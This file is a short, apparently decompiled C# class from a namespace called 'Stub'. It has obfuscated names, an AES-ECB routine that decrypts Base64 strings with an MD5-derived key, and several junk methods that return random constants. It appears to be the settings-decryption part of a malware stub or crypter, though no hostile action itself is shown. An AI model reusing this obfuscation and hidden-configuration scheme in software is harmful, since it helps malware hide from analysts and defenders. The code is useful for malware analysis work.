using System;
using System.Security.Cryptography;
using System.Text;

namespace Stub;

public class howPsFUo5PIyjMj21J1ZW4WubV2Zd
{
	public static object NjmUCvjJjpDlJoIdV89vJI8orUcqQ(string R5WquDthuQRFw0PdePutZzcbw0G8Z)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		byte[] array = new byte[32];
		byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(jVPxNvA35Q3nrCsV1GuGLbPJhdCNf(LLQqOMuku02a3eSHe7KxkMgL5QsXp0CTkIoG4QmrIXrV.OmkQsr833DuNM3zEXoDlca3JH8nZdkisYEjzAB4NptCr));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		byte[] array2 = Convert.FromBase64String(R5WquDthuQRFw0PdePutZzcbw0G8Z);
		return ATjfJBKEtZ1JuGLGm5wx1nH0TNRjj(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
	}

	private static byte[] jVPxNvA35Q3nrCsV1GuGLbPJhdCNf(string Li8jy2hCJjpIJZ8LTYx64NaVUvZZg)
	{
		return Encoding.UTF8.GetBytes(Li8jy2hCJjpIJZ8LTYx64NaVUvZZg);
	}

	private static string ATjfJBKEtZ1JuGLGm5wx1nH0TNRjj(byte[] Jz9sI9jTp0QMEMaiWf0U2lSHhz1sf)
	{
		return Encoding.UTF8.GetString(Jz9sI9jTp0QMEMaiWf0U2lSHhz1sf);
	}

	public static string xy7wi9BhD1F6rBDEwWOQY()
	{
		return "81DPOgIEo1cHsfiebm37Q";
	}

	public static int fB6IaQ3bBNvxX19FmEZMv()
	{
		return 48958815;
	}

	public static string smethod_0()
	{
		return "ky6ucQLPZ4Zf0NB18x2XB";
	}

	public static int vYMKLLqyD00LYzxJmJC5v()
	{
		return 66730053;
	}

	public static string AGsj73VAFRKK5mvUXBjDV()
	{
		return "b2g2EI5OHc7xHUhyATJjU";
	}

	public static int aVEOPmIVnA3rg2Xm9I5rn()
	{
		return 33836983;
	}

	public static string smethod_1()
	{
		return "zVpQvj1SnpimCyqLosIHI";
	}

	public static int smethod_2()
	{
		return 57840520;
	}
}
